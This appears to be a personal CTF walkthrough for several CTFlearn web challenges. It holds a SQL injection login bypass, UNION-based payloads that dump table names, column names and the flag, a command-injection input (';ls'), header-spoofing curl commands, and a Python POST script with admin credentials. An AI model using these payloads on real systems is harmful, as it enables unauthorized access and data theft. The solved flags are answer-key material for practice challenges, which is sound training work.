- `URL`: https://ctflearn.com/

## Web

### My Blog
 - Description
 ```text
 Hi, I'm Noxtal! I have hidden a flag somewhere in my Cyberworld (AKA blog)...
  you may find a good application for your memory. ;)
 Note: This is my real website (thus no deadly bug to exploit here).
       You might want to read some of my content (writeups, tutorials, and cheatsheets).
       I would be glad to receive any kind of feedback.
 Click here to access it, have fun checking my blog out! Cheers!
 Hint: replace the flag{} part with CTFlearn{}.
 ```
- `Walk-Throught`
    - `F12` -> `LocalStorage` : Get Flag

### Basic Injection
 - Description
 ```text
 See if you can leak the whole database using what you know about SQL Injections. link
 Don't know where to begin? Check out CTFlearn's SQL Injection Lab
 ```
 - `Walk-Throught`
   - payload: 'or '1'='1

### POST Practice
 - Description
 ```text
 This website requires authentication, via POST.
 However, it seems as if someone has defaced our site.
 Maybe there is still some way to authenticate? http://165.227.106.113/post.php
 ```
 - `Walk-Throught`
   ```python
   import requests
   data = {
		"username":"admin",
		"password":"71urlkufpsdnlkadsf"
	}
	URL = "http://165.227.106.113/post.php"

	r = requests.post(URL,data=data)
	print(r.text)
   ```

### Don't Bump Your Head(er) 
 - Description
 ```text
 Try to bypass my security measure on this site! http://165.227.106.113/header.php
 ```
 - `Walk-Throught`
    ```sh
    curl -H "User-Agent: Sup3rS3cr3tAg3nt" --refer "awesomesauce.com" http://165.227.106.113/header.php
    ```

### Calculat3 M3 
 - Description
 ```text
 Here! http://web.ctflearn.com/web7/ 
 I forget how we were doing those calculations,
 but something tells me it was pretty insecure.
 ```
 - `Walk-Throught`
 ```sh
 curl -X POST "https://web.ctflearn.com/web7/" -d "expression=;ls"
 ```

### Inj3ction Time 
  - Description
 ```text
 I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere.
 UNION might be a helpful command
 ```
 - `Walk-Throught`
 ```text
 @PAYLOAD 1 : 1 union select 1,2,3,4

 @PAYLOAD 2 : 1 union select 1,table_name,3,4 from information_schema.TABLES --> w0w_y0u_f0und_m3

 @PAYLOAD 3 : 1 union select 1, column_name, 3, 4 from information_schema.columns --> f0und_m3

 @PAYLOAD 4 : 1 union select 1, f0und_m3, 3, 4 from w0w_y0u_f0und_m3 --> abctf{uni0n_1s_4_gr34t_c0mm4nd}
 ```